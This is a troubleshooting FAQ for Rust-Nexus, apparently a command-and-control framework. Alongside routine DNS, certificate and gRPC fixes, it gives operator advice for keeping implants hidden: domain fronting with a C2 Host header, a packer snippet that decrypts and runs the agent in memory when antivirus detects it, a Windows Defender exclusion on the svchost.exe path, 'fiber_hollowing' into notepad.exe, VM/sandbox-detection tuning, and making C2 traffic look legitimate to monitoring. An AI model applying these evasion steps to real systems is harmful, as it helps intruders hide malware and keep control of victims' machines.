# Troubleshooting & FAQ

Common issues and solutions for Rust-Nexus deployment and operation.

## Infrastructure Issues

### Cloudflare API Problems

#### Q: "Cloudflare API authentication failed"
**A:** Check your API token configuration:

```bash
# Verify token validity
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/user/tokens/verify"

# Check token permissions
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/user/tokens/YOUR_TOKEN_ID"
```

**Required permissions:**
- Zone:Read, Zone:Edit
- DNS:Read, DNS:Edit
- SSL and Certificates:Read (if using origin certificates)

#### Q: "DNS record creation failed"
**A:** Verify zone ID and domain configuration:

```bash
# List zones to find correct zone ID
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/zones"

# Check existing DNS records
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records"
```

#### Q: "Domain rotation not working"
**A:** Check domain manager configuration and limits:

```toml
[domains]
max_subdomains = 10  # Ensure this allows for rotation
rotation_interval = 24  # Check if rotation is due

# Debug domain rotation
./target/release/nexus-infra domains rotate --config nexus.toml --dry-run
```

### Certificate Issues

#### Q: "Let's Encrypt certificate request failed"
**A:** Common Let's Encrypt issues:

```bash
# Check ACME account status
./target/release/nexus-infra certificates account-info --config nexus.toml

# Test DNS-01 challenge manually
dig TXT _acme-challenge.yourdomain.com

# Check Let's Encrypt rate limits
curl "https://acme-v02.api.letsencrypt.org/directory"
```

**Rate limit solutions:**
- Use Let's Encrypt staging for testing
- Wait for rate limit reset (1 week)
- Use different base domains

#### Q: "Certificate validation failed"
**A:** Verify certificate chain and configuration:

```bash
# Check certificate validity
openssl x509 -in certs/yourdomain.com.crt -noout -dates

# Verify certificate chain
openssl verify -CAfile certs/chain.pem certs/yourdomain.com.crt

# Check certificate SAN
openssl x509 -in certs/yourdomain.com.crt -noout -text | grep -A 5 "Subject Alternative Name"

# Test TLS connection
openssl s_client -connect yourdomain.com:443 -servername yourdomain.com
```

#### Q: "Certificate pinning validation failed"
**A:** Update pinned certificate fingerprints:

```bash
# Get current certificate fingerprint
openssl x509 -in certs/yourdomain.com.crt -noout -fingerprint -sha256

# Update configuration with new fingerprint
vim nexus.toml  # Update pinned_fingerprints array
```

## Communication Issues

### gRPC Connection Problems

#### Q: "gRPC connection timeout"
**A:** Check network connectivity and TLS configuration:

```bash
# Test basic connectivity
telnet yourdomain.com 443

# Test TLS handshake
openssl s_client -connect yourdomain.com:443

# Check gRPC service availability
grpcurl -insecure yourdomain.com:443 list

# Test with verbose logging
RUST_LOG=debug ./target/release/nexus-agent --config agent.toml
```

#### Q: "Mutual TLS authentication failed"
**A:** Verify client certificates and CA configuration:

```bash
# Check client certificate validity
openssl x509 -in client.crt -noout -dates

# Verify client certificate chain
openssl verify -CAfile ca.crt client.crt

# Test mutual TLS connection
curl --cert client.crt --key client.key --cacert ca.crt \
     https://yourdomain.com:443
```

#### Q: "gRPC streaming interrupted"
**A:** Check connection stability and timeout configuration:

```toml
# Adjust timeout settings
[grpc_server]
connection_timeout = 60  # Increase timeout
keepalive_interval = 30  # More frequent keepalives

[grpc_client] 
request_timeout = 60
max_retry_attempts = 5
```

### Domain Fronting Issues

#### Q: "Domain fronting not working"
**A:** Verify CDN configuration and headers:

```bash
# Test domain fronting manually
curl -H "Host: real-c2-domain.com" https://cdn-domain.com/

# Check Cloudflare proxy settings
curl -H "Authorization: Bearer TOKEN" \
     "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records/RECORD_ID"

# Verify proxy is enabled (orange cloud)
# proxied: true in DNS record
```

**Common fixes:**
- Ensure Cloudflare proxy is enabled
- Use appropriate Host header
- Check CDN supports the target path
- Verify SSL/TLS compatibility

## Agent Issues

### Agent Connection Problems

#### Q: "Agent not connecting to C2 server"
**A:** Debug agent connectivity step by step:

```bash
# Check DNS resolution
nslookup c2-domain.com

# Test network connectivity
telnet c2-domain.com 443

# Check agent configuration
./target/release/nexus-agent --config agent.toml --verify-config

# Test with debug logging
RUST_LOG=debug ./target/release/nexus-agent --config agent.toml
```

#### Q: "Agent registration failed"
**A:** Check agent capabilities and server configuration:

```bash
# Verify agent capabilities
./target/release/nexus-agent --list-capabilities

# Check server agent limits
./target/release/nexus-server config show | grep max_agents

# Test registration manually
./target/release/nexus-agent --config agent.toml --test-registration
```

### Agent Execution Issues

#### Q: "BOF execution failed"
**A:** Debug BOF loading and execution:

```bash
# Check BOF file format
file your-bof.obj

# Validate COFF structure
objdump -f your-bof.obj

# Test BOF loading
RUST_LOG=debug ./target/release/nexus-agent --test-bof your-bof.obj

# Check available APIs
./target/release/nexus-agent --list-bof-apis
```

#### Q: "Fiber execution not working"
**A:** Verify Windows platform and capabilities:

```bash
# Check Windows version compatibility
systeminfo | grep "OS Name"

# Verify process architecture
./target/release/nexus-agent --check-architecture

# Test fiber conversion
./target/release/nexus-agent --test-fiber-conversion
```

#### Q: "Task execution timeout"
**A:** Adjust timeout settings and check system load:

```toml
# Increase task timeouts
[execution]
default_timeout = 300  # 5 minutes
max_timeout = 1800     # 30 minutes

[tasks.shell_command]
timeout = 120  # 2 minutes for shell commands
```

## Performance Issues

### High Memory Usage

#### Q: "Agent memory usage increasing over time"
**A:** Check for memory leaks and optimize:

```rust
// Monitor memory usage
use std::alloc::{GlobalAlloc, Layout};

struct MemoryMonitor<A: GlobalAlloc>(A, AtomicUsize);

impl<A: GlobalAlloc> GlobalAlloc for MemoryMonitor<A> {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let ptr = self.0.alloc(layout);
        if !ptr.is_null() {
            self.1.fetch_add(layout.size(), Ordering::Relaxed);
        }
        ptr
    }
    
    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        self.0.dealloc(ptr, layout);
        self.1.fetch_sub(layout.size(), Ordering::Relaxed);
    }
}
```

#### Q: "Server running out of memory"
**A:** Configure memory limits and garbage collection:

```toml
[grpc_server]
max_connections = 1000  # Limit concurrent connections
max_message_size = 16777216  # 16MB message limit

[agent_management]
inactive_agent_timeout = 300  # 5 minutes
cleanup_interval = 60  # Clean up every minute
max_agents_per_server = 5000
```

### High CPU Usage

#### Q: "CPU usage consistently high"
**A:** Profile and optimize performance:

```bash
# Profile the server
perf record -g ./target/release/nexus-server --config nexus.toml
perf report

# Check for infinite loops in agents
ps aux | grep nexus-agent
strace -p AGENT_PID

# Optimize configuration
vim nexus.toml  # Increase intervals, reduce polling frequency
```

## Security Issues

### Detection Avoidance

#### Q: "Agent detected by antivirus"
**A:** Enhance obfuscation and evasion:

```rust
// Add runtime packer
use std::process::Command;

fn runtime_unpack() -> Result<(), std::io::Error> {
    // Decrypt and load agent in memory
    let encrypted_agent = include_bytes!("encrypted_agent.bin");
    let key = derive_runtime_key();
    let decrypted = decrypt_agent(encrypted_agent, &key)?;
    
    // Load into memory and execute
    execute_from_memory(&decrypted)?;
    Ok(())
}
```

#### Q: "VM detection triggering false positives"
**A:** Adjust detection sensitivity:

```toml
[security.anti_analysis]
vm_detection = true
detection_sensitivity = "medium"  # "low", "medium", "high"

# Or disable specific checks
vm_detection_methods = ["timing", "artifacts"]  # Exclude "hardware"
```

### Certificate Security

#### Q: "Certificate transparency logs exposing infrastructure"
**A:** Use certificate transparency monitoring:

```bash
# Monitor certificate transparency logs
curl "https://crt.sh/?q=yourdomain.com&output=json"

# Set up alerts for new certificates
# Use services like CertStream or Facebook CT monitoring
```

## Recovery Procedures

### Infrastructure Recovery

#### Q: "Complete infrastructure compromise"
**A:** Emergency recovery procedure:

```bash
#!/bin/bash
# Emergency infrastructure burn procedure

echo "WARNING: This will destroy all current infrastructure"
read -p "Are you sure? (type 'BURN' to continue): " confirm

if [ "$confirm" = "BURN" ]; then
    # Revoke all certificates
    ./target/release/nexus-infra certificates revoke --all --reason compromise
    
    # Delete all DNS records
    ./target/release/nexus-infra domains cleanup --all --force
    
    # Rotate all API keys
    ./scripts/emergency-key-rotation.sh
    
    # Deploy new infrastructure
    ./scripts/deploy-new-infrastructure.sh --emergency-mode
    
    echo "Emergency burn completed"
fi
```

#### Q: "Agent communication compromised"
**A:** Implement emergency communication protocol:

```rust
// Emergency fallback communication
pub struct EmergencyComms {
    backup_domains: Vec<String>,
    emergency_keys: Vec<[u8; 32]>,
}

impl EmergencyComms {
    pub async fn establish_emergency_channel(&self) -> InfraResult<()> {
        for domain in &self.backup_domains {
            for key in &self.emergency_keys {
                if let Ok(channel) = self.try_emergency_connect(domain, key).await {
                    return self.switch_to_emergency_mode(channel).await;
                }
            }
        }
        
        // If all fails, implement dead drop communication
        self.activate_dead_drop_protocol().await
    }
}
```

## Best Practices Checklist

### Pre-Production Checklist
- [ ] **API Tokens**: Secured and rotated regularly
- [ ] **Certificates**: Valid chains with proper expiration monitoring  
- [ ] **Domain Rotation**: Tested and scheduled appropriately
- [ ] **Agent Obfuscation**: Applied and tested against AV
- [ ] **Network Security**: Firewall rules and intrusion detection
- [ ] **Access Control**: RBAC implemented and tested
- [ ] **Monitoring**: Comprehensive logging and alerting
- [ ] **Backup Procedures**: Tested recovery procedures
- [ ] **Incident Response**: Documented and practiced procedures

### Operational Checklist
- [ ] **Daily**: Health checks and certificate status
- [ ] **Weekly**: Domain rotation and security scans
- [ ] **Monthly**: API key rotation and security audit
- [ ] **Quarterly**: Infrastructure penetration testing
- [ ] **Annually**: Complete security review and update

### Security Validation Checklist
- [ ] **TLS Configuration**: Strong ciphers and protocols only
- [ ] **Certificate Pinning**: Validated against known good certificates
- [ ] **Domain Fronting**: Traffic appears legitimate to network monitoring
- [ ] **Anti-Analysis**: VM/debugger/sandbox detection working
- [ ] **Memory Protection**: Secure memory allocation for sensitive data
- [ ] **Runtime Protection**: Integrity checks and anti-hooking
- [ ] **Log Sanitization**: No sensitive data in logs
- [ ] **Configuration Security**: Encrypted configuration storage

## Getting Help

### Debug Information Collection
When reporting issues, include:

```bash
# System information
uname -a
cargo --version
openssl version

# Configuration (sanitized)
./target/release/nexus-infra config validate --config nexus.toml

# Logs (recent errors only)
grep -E "(ERROR|PANIC|FATAL)" logs/nexus-server.log | tail -50

# Infrastructure status
./target/release/nexus-infra status --all --config nexus.toml

# Network diagnostics
ss -tlnp | grep :443
iptables -L | grep 443
```

### Log Analysis
```bash
# Common log analysis commands
# Infrastructure errors
grep "InfraError" logs/nexus-infra.log

# Certificate issues
grep -i "certificate\|tls\|ssl" logs/*.log

# Domain problems
grep -i "domain\|dns" logs/*.log

# Agent connectivity
grep -i "agent\|connection\|registration" logs/nexus-server.log

# Task execution issues  
grep -i "task\|execution\|bof" logs/*.log
```

### Performance Analysis
```bash
# Memory usage analysis
ps aux | grep nexus
pmap PID

# CPU usage analysis
top -p PID
perf top -p PID

# Network analysis
netstat -i
iftop

# Disk usage
du -sh /opt/nexus/*
iostat -x 1
```

## Emergency Procedures

### Immediate Response
1. **Isolate Compromised Systems**: Disconnect from network
2. **Preserve Evidence**: Stop logging rotation, backup current logs
3. **Assess Scope**: Determine which components are compromised
4. **Activate Backup Infrastructure**: Switch to backup domains/servers
5. **Notify Stakeholders**: Alert relevant teams and management

### Recovery Steps
1. **Infrastructure Burn**: Destroy compromised infrastructure
2. **Forensic Analysis**: Analyze logs and artifacts
3. **Rebuild Infrastructure**: Deploy new infrastructure with lessons learned
4. **Update Security**: Implement additional protections
5. **Post-Incident Review**: Document lessons learned

### Communication Plan
```bash
# Emergency contact script
#!/bin/bash
INCIDENT_TYPE="$1"
SEVERITY="$2"

# Send alerts via multiple channels
curl -X POST "https://hooks.slack.com/services/..." \
     -d "{\"text\":\"NEXUS INCIDENT: $INCIDENT_TYPE - Severity: $SEVERITY\"}"

# Email notification
echo "Nexus incident detected: $INCIDENT_TYPE" | \
     mail -s "URGENT: Nexus Security Incident" security-team@company.com

# SMS notification (via API)
curl -X POST "https://api.twilio.com/2010-04-01/Accounts/ACCOUNT_SID/Messages.json" \
     --data-urlencode "To=+1234567890" \
     --data-urlencode "Body=Nexus incident: $INCIDENT_TYPE"
```

## Known Issues and Workarounds

### Issue: Windows Defender Real-time Protection
**Problem**: Agent deleted by Windows Defender
**Workaround**: 
```bash
# Add exclusion for agent path
Add-MpPreference -ExclusionPath "C:\Windows\System32\svchost.exe"

# Or use alternative execution methods
./nexus-agent --execution-method fiber_hollowing --target-process notepad.exe
```

### Issue: Corporate Firewall Blocking gRPC
**Problem**: Corporate firewall blocks gRPC traffic
**Workaround**:
```toml
# Use HTTP/2 over port 80 or 8080
[grpc_server]
port = 80
use_h2c = true  # HTTP/2 without TLS (behind reverse proxy)

# Or use gRPC-Web
[grpc_server]
enable_grpc_web = true
cors_origins = ["https://legitimate-app.com"]
```

### Issue: Let's Encrypt Rate Limiting
**Problem**: Too many certificate requests
**Workaround**:
```toml
# Use Let's Encrypt staging for testing
[letsencrypt]
acme_directory_url = "https://acme-staging-v02.api.letsencrypt.org/directory"

# Or use longer certificate validity
[letsencrypt]
cert_renewal_days = 60  # Renew later to reduce frequency
```

### Issue: Cloudflare API Rate Limiting  
**Problem**: Too many DNS API calls
**Workaround**:
```toml
# Reduce API call frequency
[domains]
rotation_interval = 48  # Rotate less frequently
health_check_interval = 300  # Check health less often

# Implement caching
[cloudflare]
enable_caching = true
cache_ttl = 3600  # 1-hour cache
```

## Community Support

### Documentation Resources
- **[Infrastructure Guide](../infrastructure/README.md)** - Setup and configuration
- **[API Reference](../api/grpc-reference.md)** - Complete API documentation
- **[BOF Guide](../execution/bof-guide.md)** - BOF development and execution
- **[Examples](../../examples/)** - Working deployment examples

### Issue Reporting
When reporting issues:
1. **Search existing issues** first
2. **Use issue templates** provided in repository
3. **Include debug information** (sanitized logs, configuration)
4. **Provide minimal reproduction steps**
5. **Specify environment details** (OS, Rust version, etc.)

### Contributing Fixes
1. **Fork repository** and create feature branch
2. **Add tests** for any new functionality
3. **Update documentation** for changes
4. **Follow code style guidelines**
5. **Submit pull request** with detailed description

This troubleshooting guide should help resolve the most common issues encountered in Rust-Nexus deployments. For additional support, consult the comprehensive documentation or engage with the community.
